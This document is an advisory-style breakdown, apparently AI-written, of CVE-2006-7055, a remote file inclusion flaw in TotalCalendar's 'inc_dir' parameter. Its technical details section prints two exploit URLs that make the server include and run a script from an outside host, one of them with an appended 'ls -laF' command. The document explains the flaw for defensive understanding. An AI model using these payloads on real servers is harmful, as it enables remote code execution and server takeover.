Based on the provided content, here's a breakdown of the vulnerability associated with CVE-2006-7055:

**Root cause of vulnerability:**
The vulnerability is a Remote File Inclusion (RFI) vulnerability present in TotalCalendar <= 2.30. The application improperly handles the `inc_dir` parameter, allowing remote files to be included.

**Weaknesses/vulnerabilities present:**
- **Remote File Inclusion (RFI):** The application includes external files specified by the attacker via the `inc_dir` parameter. This allows arbitrary code execution.

**Impact of exploitation:**
- **Arbitrary Code Execution:** Attackers can inject malicious code by including files from a remote server controlled by the attacker. This code will then be executed on the vulnerable server.
- **Server compromise:** Successful exploitation can lead to complete compromise of the server.

**Attack vectors:**
- **HTTP GET Request:** The vulnerability is triggered through a GET request to `index.php` with the `inc_dir` parameter.

**Required attacker capabilities/position:**
- **Network Access:** The attacker needs network access to the vulnerable server.
- **Web Server:** The attacker needs a web server to host the malicious script.

**Technical details**
The vulnerable URL is in the format `index.php?inc_dir=http://www.yourspace.com/yourscript.php?` or `index.php?inc_dir=http://www.yourspace.com/yourscript.txt?&ls%20-laF`. This indicates the `inc_dir` parameter is directly used to include a file from a remote location.

This vulnerability is rated as "remote" and affects the PHP platform.
